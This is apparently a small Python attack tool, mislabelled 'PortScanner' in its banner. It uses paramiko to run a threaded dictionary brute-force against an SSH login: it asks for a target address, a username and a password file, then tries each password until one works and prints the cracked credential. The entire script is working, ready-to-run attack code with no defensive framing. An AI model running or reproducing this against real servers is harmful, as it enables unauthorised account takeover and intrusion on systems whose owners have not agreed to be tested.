import paramiko, sys, os, socket
import threading, time
from colorama import Fore

print(Fore.YELLOW + "\n~ Welcome to PortScanner ~") 
print(Fore.YELLOW + "\nCreated By:") 
print(Fore.WHITE + " ____  _  _       ___")       
print(Fore.WHITE + "|  _ \| || | ____/ _ \ _ __") 
print(Fore.WHITE + "| |_) | || ||_  / | | | '__|")
print(Fore.WHITE + "|  _ <|__   _/ /| |_| | |   ")
print(Fore.WHITE + "|_| \_\  |_|/___|\___/|_|   ")

print(Fore.YELLOW + "\nWeb Page: https://juankaenel.com \n")
print(Fore.YELLOW + "[Info] Tool developed in python to brute force the ssh service \n")
print(Fore.YELLOW + "----------------------------------------------------------------------------------\n")            


stop_flag=0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host,port=22, username=username, password=password)
        stop_flag = 1
        print(Fore.GREEN + '[+] Found password: ' + password + ' , for account: ' + username)
    except:
        print(Fore.RED + '[-] Incorrect login, the password doesn\'t match: ' + password)
    ssh.close()
    


host = input('[*] Target address: ')
username = input('[*] SSH Username: ')
input_file = input('[*] Passwords dictionary: ')
print('\n')

if os.path.exists(input_file) == False:
    print(Fore.RED + '[!] That dictionary/path doesnt exist')
    sys.exit(1)

print('* * * Starting threaded SSH bruteforce on ' + host + ' with account: ' + username + ' * * *\n')

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t=threading.Thread(target=ssh_connect, args=(password,)) # objeto thread
        t.start()
        time.sleep(0.5)

                
